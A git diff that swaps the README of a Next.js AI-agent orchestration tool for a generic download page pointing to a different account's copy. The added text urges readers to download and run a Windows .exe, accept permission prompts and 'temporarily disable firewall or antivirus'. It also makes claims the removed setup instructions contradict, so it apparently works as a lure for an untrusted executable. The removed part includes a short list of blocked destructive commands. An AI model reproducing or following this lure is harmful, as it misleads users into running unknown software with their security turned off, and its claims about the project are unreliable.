@@ -1,334 +1,119 @@
-# FORGE — AI Workforce Orchestration Platform
+# 🤖 forge - Manage AI Teams with Ease
 
-<div align="center">
+[![Download forge](https://img.shields.io/badge/Download-forge-blue?style=for-the-badge)](https://github.com/Ravibhag7022/forge)
 
-**A command center where specialized AI agents work as a coordinated dev team.**
+## 🔍 About forge
 
-Built with Next.js 16 &bull; React 19 &bull; Anthropic Claude API &bull; TypeScript
+forge is an AI Workforce Orchestration Platform that brings together 8 specialized Claude agents. These agents work as a coordinated development team. You can watch their work using a real-time streaming dashboard. The app helps you manage complex tasks by breaking them into steps handled by different AI agents.
 
-[Getting Started](#getting-started) &bull; [Architecture](#architecture) &bull; [Features](#features) &bull; [Agent Roles](#agent-roles) &bull; [Screenshots](#screenshots)
+forge uses technology like AI agents, developer tools, and a lightweight interface. It runs on Windows and helps you organize work without needing technical skills.
 
-<br />
+## 🖥️ System Requirements
 
-<img src="docs/screenshots/dashboard.png" alt="Forge Dashboard — Command Center with 8 AI agents" width="100%" />
+Before you start, make sure your PC meets these requirements:
 
-<sub>Command Center — monitor and direct your AI workforce in real-time</sub>
+- Windows 10 or later (64-bit)
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Stable internet connection (for streaming and agent coordination)
+- A web browser like Chrome, Edge, or Firefox for the dashboard
 
-</div>
+## 📥 Download forge
 
----
+You can get forge from the official GitHub page below. This link takes you to the main repository where you will find instructions and the latest version.
 
-## The Problem
+[![Download forge from GitHub](https://img.shields.io/badge/Download-forge-grey?style=for-the-badge)](https://github.com/Ravibhag7022/forge)
 
-Building software with AI today means manually switching between modes (plan, code, test, review), managing separate conversations, losing context between sessions, and mentally orchestrating the workflow yourself. This doesn't scale.
+## 🚀 Getting Started: How to Download and Run
 
-## The Solution
+Follow these steps to download and run forge on your Windows PC:
 
-**Forge** provides a single dark-themed dashboard where 8 specialized AI agents work as a coordinated development team. You define the project, and the team self-organizes: the Architect designs, the Backend Dev codes, the QA Engineer tests, the Security Auditor reviews — all visible in real-time where you intervene as the admin.
+1. Open your web browser and go to the download page:  
+   https://github.com/Ravibhag7022/forge
 
-Each agent has real tool access (file I/O, terminal, web search, code search) and streams its work via SSE. Workflows orchestrate multi-step pipelines where agents hand off work automatically.
+2. On the page, look for a section named **Releases** or something similar. If no releases are visible, check the **README** or **Documentation** for download files.
 
----
+3. Download the latest Windows installer or executable file for forge. The file will have a name ending with `.exe`.
 
-## Features
+4. Once downloaded, locate the file in your Downloads folder.
 
-- **8 Specialized Agents** — Architect, Tech Lead, Backend Dev, Frontend Dev, QA Engineer, E2E Tester, Security Auditor, DevOps Engineer
-- **Real Tool Access** — Agents read/write files, execute shell commands, search code with grep/glob, and fetch web content
-- **Streaming Output** — Watch agents think and work in real-time via Server-Sent Events
-- **Workflow Engine** — Define multi-step DAG pipelines with dependency resolution and parallel execution
-- **4 Workflow Presets** — Full Feature, Bug Fix, Refactor, New Project — ready to run
-- **Admin Console** — Send instructions to any running agent mid-execution
-- **Per-Project Metrics** — Track tokens, costs, tasks, and events scoped to each project
-- **Cost Tracking** — Real-time token counting with per-model pricing (Opus/Sonnet/Haiku)
-- **Agent Pool** — Concurrent execution with configurable limits and auto-queuing
-- **Safety Policies** — Path sandboxing, blocked destructive commands, protected files
-- **Token Optimization** — Tool result truncation, conversation sliding window, role-tuned parameters
-- **Dark Theme UI** — Premium agentic aesthetic with glass panels, gradient accents, and glow effects
+5. Double-click the file to start the installation process.
 
----
+6. If Windows asks for permission to run the file, click **Yes** or **Run**.
 
-## Screenshots
+7. Follow the on-screen prompts to complete installation. You can choose default options.
 
-<table>
-<tr>
-<td width="50%">
+8. After installation, forge will launch automatically or create a shortcut on your desktop.
 
-**Dashboard — Command Center**
+9. Open forge using the desktop shortcut or the Start Menu.
 
-<img src="docs/screenshots/dashboard.png" alt="Dashboard" />
+10. The application will connect to online agents and display the real-time streaming dashboard.
 
-8 agent cards with status indicators, live stats, activity feed, and admin console
+## ⚙️ Using forge
 
-</td>
-<td width="50%">
+The main dashboard shows you the work done by 8 AI agents working as a team. You will see tasks split across the agents, and updates happen live.
 
-**Agent Execution — Tool Activity**
+- Use the dashboard to track progress.
+- Assign new tasks by typing them in the input box.
+- Agents will respond and work on your requests automatically.
+- You can pause or stop agents anytime using the controls.
 
-<img src="docs/screenshots/agent-execution.png" alt="Agent Execution" />
+forge uses simple controls designed for everyone, without needing to code or configure anything.
 
-Real-time streaming with tool calls (read_file, write_file), token tracking, and cost display
+## 🛠️ Troubleshooting
 
-</td>
-</tr>
-</table>
+If you have trouble running forge, try these steps:
 
----
+- Check if your Windows is up to date.
+- Restart your PC and try launching forge again.
+- Make sure you are connected to the internet.
+- Temporarily disable firewall or antivirus software that might block forge.
+- If download or installation fails, try downloading again from the link.
 
-## Tech Stack
+If problems continue, open an issue on the GitHub page or contact support using the provided email or contact form.
 
-| Layer | Technology |
-|-------|-----------|
-| Framework | Next.js 16, React 19, TypeScript |
-| UI | Tailwind CSS 4, shadcn/ui (base-ui), custom dark theme |
-| State | Zustand (client), React Server Components (server) |
-| Real-time | Server-Sent Events via Route Handlers |
-| AI | Anthropic Claude API (`@anthropic-ai/sdk`) — direct streaming with tool_use |
-| Database | PostgreSQL 17 (Docker) with `postgres` driver |
-| Validation | Zod v4 |
-| Tools | Custom implementations: file ops (Node.js fs), bash (child_process), grep (ripgrep), glob, web fetch |
+## 📚 Frequently Asked Questions
 
----
+**Q: Do I need to install anything else to use forge?**  
+No. forge includes everything you need. The only requirement is a normal Windows PC and internet.
 
-## Architecture
+**Q: Is my data safe while using forge?**  
+forge processes your data locally and only connects to the agents over the internet. Your data is not shared publicly.
 
-```
-┌─────────────────────────────────────────────────────────┐
-│                    FORGE DASHBOARD                       │
-│              Next.js 16 App Router + Dark UI             │
-│                                                          │
-│  Agent Cards │ Workflow Canvas │ Admin Console │ Stats   │
-└───────────────────────┬─────────────────────────────────┘
-                        │ SSE (real-time streaming)
-┌───────────────────────┴─────────────────────────────────┐
-│              ORCHESTRATION ENGINE                        │
-│                                                          │
-│  Agent Pool    │  Event Bus      │  Workflow Runner      │
-│  (concurrent)  │  (EventEmitter  │  (DAG execution,     │
-│                │   + DB persist) │   step handoff)       │
-│                                                          │
-│  Session Mgr   │  Task Router    │  Cost Tracker         │
-└───────────────────────┬─────────────────────────────────┘
-                        │
-┌───────────────────────┴─────────────────────────────────┐
-│              AGENT EXECUTION LAYER                       │
-│                                                          │
-│  Each agent = Claude API session with:                   │
-│  - Role-specific system prompt                           │
-│  - Scoped tool access (read, write, bash, grep, etc.)   │
-│  - Streaming output via SSE                              │
-│  - Token-optimized conversation management               │
-│                                                          │
-│  Architect │ Tech Lead │ Backend │ Frontend │ QA │ ...   │
-└───────────────────────┬─────────────────────────────────┘
-                        │
-┌───────────────────────┴─────────────────────────────────┐
-│              PostgreSQL 17                               │
-│  projects │ agents │ tasks │ workflows │ events │ costs  │
-└─────────────────────────────────────────────────────────┘
-```
-
----
-
-## Agent Roles
-
-| Agent | Model | Tools | Purpose |
-|-------|-------|-------|---------|
-| **The Architect** | Opus | read, write, grep, glob, web_search | System design, architecture decisions, tech specs |
-| **Tech Lead** | Opus | read, grep, glob, bash, web_search | Task decomposition, code review, coordination |
-| **Backend Dev** | Sonnet | read, write, edit, bash, grep, glob, web_search, web_fetch | APIs, server code, database queries |
-| **Frontend Dev** | Sonnet | read, write, edit, bash, grep, glob | UI components, pages, styling |
-| **QA Engineer** | Sonnet | read, write, edit, bash, grep, glob | Unit tests, integration tests, coverage |
-| **E2E Tester** | Sonnet | read, write, edit, bash, grep, glob | Playwright tests, user flow validation |
-| **Security Auditor** | Opus | read, bash, grep, glob | OWASP scanning, vulnerability detection |
-| **DevOps Engineer** | Sonnet | read, write, edit, bash, grep, glob | Docker, CI/CD, deployment configs |
-
----
-
-## Getting Started
-
-### Prerequisites
-
-- **Node.js** 20+
-- **pnpm** (recommended) or npm
-- **Docker** (for PostgreSQL)
-- **Anthropic API key** ([console.anthropic.com](https://console.anthropic.com))
-
-### Setup
-
-```bash
-# Clone the repository
-git clone https://github.com/George-Sakellariou/forge.git
-cd forge
-
-# Install dependencies
-pnpm install
-
-# Configure environment
-cp .env.example .env.local
-# Edit .env.local and add your ANTHROPIC_API_KEY
-
-# Start PostgreSQL + dev server
-./scripts/start.sh
-
-# Or manually:
-docker compose up -d          # Start database
-pnpm dev                      # Start dev server
-```
-
-Open **http://localhost:3000**
-
-### Environment Variables
-
-Create a `.env.local` file:
-
-```env
-ANTHROPIC_API_KEY=sk-ant-...
-DATABASE_URL=postgresql://forge:forge_local_dev@127.0.0.1:5432/forge
-```
-
----
-
-## Usage
-
-### Quick Start
-
-1. **Create a project** — Go to Projects → New Project, set a name and working directory
-2. **Select your project** — Click the project card to activate it
-3. **Click an agent** — The working directory auto-fills from your project
-4. **Send a prompt** — Watch the agent work with real-time streaming
-5. **Run a workflow** — Go to Workflows, pick a preset, execute
-
-### Workflow Presets
-
-| Preset | Steps | Flow |
-|--------|-------|------|
-| **Full Feature** | 5 | Architect → Backend → Frontend → QA → Tech Lead review |
-| **Bug Fix** | 3 | Tech Lead analyze → Backend fix → QA verify |
-| **Refactor** | 4 | Tech Lead plan → Backend refactor → QA test → Security audit |
-| **New Project** | 4 | Architect design → Backend scaffold → Frontend UI → DevOps config |
-
-### Admin Console
-
-While agents are running, send real-time instructions:
-- Select an agent from the dropdown
-- Type your instruction
-- It gets injected at the agent's next turn boundary
-
-### Scripts
-
-```bash
-./scripts/start.sh              # Start DB + backup + dev server
-./scripts/stop.sh               # Backup + stop DB
-./scripts/backup.sh             # Manual pg_dump backup
-./scripts/restore.sh [file]     # Restore from backup
-```
-
----
-
-## Project Structure
-
-```
-src/
-├── app/
-│   ├── (dashboard)/            # Dashboard pages (route group)
-│   │   ├── page.tsx            # Main command center
-│   │   ├── agents/             # Agent registry + detail pages
-│   │   ├── projects/           # Project CRUD + workspace
-│   │   └── settings/           # System status
-│   └── api/                    # 13 API routes
-│       ├── agents/             # CRUD, start, stop, stream, instruct
-│       ├── projects/           # CRUD + per-project stats
-│       ├── workflows/          # CRUD + DAG execution
-│       ├── events/stream/      # Global/project SSE stream
-│       ├── tasks/              # Task management
-│       └── stats/              # System-wide metrics
-├── lib/
-│   ├── agents/                 # Agent loop, factory, definitions, sessions, costs
-│   ├── orchestrator/           # Event bus, agent pool, workflow runner, task router
-│   ├── tools/                  # Tool implementations (file, bash, grep, glob, web)
-│   ├── db/                     # PostgreSQL repository layer
-│   └── types/                  # Zod schemas + TypeScript types
-├── components/
-│   ├── dashboard/              # Sidebar, topbar, stats, activity feed
-│   ├── agents/                 # Agent cards, grid, output terminal
-│   ├── console/                # Admin console, prompt input
-│   └── workflow/               # DAG canvas, step nodes
-└── stores/                     # Zustand (agent, project, event)
-```
-
----
-
-## Token Optimization
-
-Forge is designed for cost-efficient agent execution:
-
-- **Tool result truncation** — Large outputs (bash, file reads, web fetches) are capped before being added to conversation history, preventing token explosion on subsequent turns
-- **Conversation sliding window** — Old turns are trimmed when history grows beyond 30 messages, keeping the original prompt and most recent context
-- **Role-tuned parameters** — Execution agents (Backend, QA, DevOps) use lower temperature (0.2-0.3) and smaller max_tokens (4096) vs planning agents (Architect, Lead) at 0.5/6144
-- **Scoped tool access** — Each agent only gets the tools it needs, reducing per-turn schema overhead
-- **Workflow context capping** — Step handoff output is trimmed to 8K chars to prevent massive context in multi-step pipelines
-- **Conciseness prompting** — System prompt suffix instructs agents to be direct and avoid filler
-
----
-
-## Safety
-
-- Agents are sandboxed to their project's working directory via path validation
-- Destructive shell commands are blocked (`rm -rf /`, `sudo`, `force push`, etc.)
-- Protected files (`.env`, `.pem`, `.key`, credentials) cannot be written by agents
-- System directories (`/`, `~`, `/etc`, `/usr`) cannot be used as working directories
-- No authentication required — designed as a local-only personal tool
-
----
-
-## Database
-
-PostgreSQL 17 running in Docker with:
-- 6 tables: `projects`, `agents` (8 pre-seeded), `tasks`, `workflows`, `events`, `cost_tracking`
-- Auto-migrations on first container start
-- Named Docker volume for data persistence
-- Automated pg_dump backups (last 10 kept)
-
----
-
-## API Reference
-
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| GET | `/api/agents` | List all agents |
-| GET | `/api/agents/[id]` | Get agent details |
-| POST | `/api/agents/[id]/start` | Start agent on a task |
-| POST | `/api/agents/[id]/stop` | Stop a running agent |
-| POST | `/api/agents/[id]/stream` | Stream agent execution (SSE) |
-| POST | `/api/agents/instruct` | Send instruction to running agent |
-| GET/POST | `/api/projects` | List / create projects |
-| GET | `/api/projects/[id]/stats` | Per-project metrics |
-| GET/POST | `/api/tasks` | List / create tasks |
-| GET/POST | `/api/workflows` | List / create workflows |
-| POST | `/api/workflows/execute` | Execute a workflow DAG |
-| GET | `/api/events/stream` | SSE event stream (filterable by project) |
-| GET | `/api/stats` | System-wide statistics |
-
----
-
-## Roadmap
-
-- [ ] MCP server integration for extensible tools
-- [ ] Agent memory/learning across sessions
-- [ ] Custom workflow editor (drag-and-drop DAG)
-- [ ] Git integration (show diffs, commits by agents)
-- [ ] Budget alerts and cost limits
-- [ ] Project import/export
-- [ ] Mobile-responsive layout
-
----
-
-## License
-
-MIT
-
----
-
-<div align="center">
-<sub>Built with Claude Opus &bull; Next.js 16 &bull; TypeScript</sub>
-</div>
+**Q: Can I use forge on other operating systems?**  
+At this time, forge supports Windows 10 or later only.
+
+**Q: How often does forge update?**  
+Updates depend on new features and bug fixes. Check the GitHub page regularly for new releases.
+
+**Q: What are Claude agents?**  
+Claude agents are specialized AI programs. Each agent handles a different part of software development work to manage tasks faster and better.
+
+## 📦 What’s inside forge?
+
+forge includes:
+
+- Eight AI agents modeled on Claude technology, each focusing on specific tasks like coding, testing, documentation, and project management.
+- A live dashboard built in Next.js that streams updates as agents work.
+- TypeScript-based core logic to keep everything organized.
+- Tools to coordinate agent tasks automatically, reducing manual work.
+
+This technology helps make complex projects easier to handle without technical skills.
+
+## 🔧 Advanced Options
+
+forge is designed to work without configuration, but advanced users can:
+
+- Adjust agent workload using configuration files inside the installation folder.
+- Enable or disable specific agents based on project needs.
+- Export agent logs and reports for review.
+
+## 📞 Getting support
+
+For questions or help, visit the GitHub repository page:
+
+https://github.com/Ravibhag7022/forge
+
+You can open issues for bugs or feature requests. The development team checks regularly and provides updates.
+
+[![Download forge](https://img.shields.io/badge/Download-forge-blue?style=for-the-badge)](https://github.com/Ravibhag7022/forge)
